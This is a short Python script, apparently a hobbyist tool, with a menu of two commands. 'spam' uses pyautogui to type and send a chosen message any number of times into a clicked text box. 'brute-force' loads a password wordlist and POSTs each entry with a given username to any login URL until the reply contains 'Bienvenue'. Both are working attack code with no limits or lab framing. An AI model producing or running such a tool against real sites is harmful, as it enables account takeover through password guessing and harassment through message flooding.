import pyautogui
import time
from colorama import Fore, Style, init
import requests

init()  # Initialisation de colorama

print(Fore.GREEN + """
 __  __    _  _____  _    ____  
|  \/  |  / \|_   _|/ \  |  _ \ 
| |\/| | / ♡ \ | | / ♡ \ | |_) |
| |  | |/ ___ \| |/ ___ \|  _ < 
|_|  |_/_/   \_\_/_/   \_\_| \_\\
        MATAR'S Programs
""" + Style.RESET_ALL)
entry = ""
print("Use -h to see what to do")
while 1:
    entry = input(":> ")
    if entry == "-h":
        print("""
        Available commands :
        - exit : Exit the program.
        - spam : Sends a message repeatedly.
        - brute-force : Attempts to guess the correct password by trying many possibilities from a word list.
"""
            )
    elif entry == "exit":
        break
    elif entry == "spam":
        message_to_send = input("What message would you like to send? :> ")
        numbers = int(input("How many messages do you want to send?:> "))
        print("Click on the send area of your application/site")
        time.sleep(5)  # Time to click on the text box
        for i in range(numbers):
            pyautogui.write(message_to_send)
            pyautogui.press("enter")
        print("Operation completed")

    elif entry == "brute-force":
        url = input("What's the URL:> ")
        word_list = input("Enter the path of ur wordlist:> ")
        mdp_list = []
        with open(word_list, "r", encoding="utf-8") as f:
            for ligne in f:
                ligne = ligne.rstrip()
                mdp_list.append(ligne) 

        username = input("Enter the username:> ")
        for mdp in mdp_list:
            data = {
                "username": username,
                "password": mdp
            }
            response = requests.post(url, data=data)
            print(f"Test avec {mdp} → ", end="")

            if "Bienvenue" in response.text:
                print(response.text[:200])
                print("✅ Connexion réussie")
                break
            else:
                print("❌ Échec")









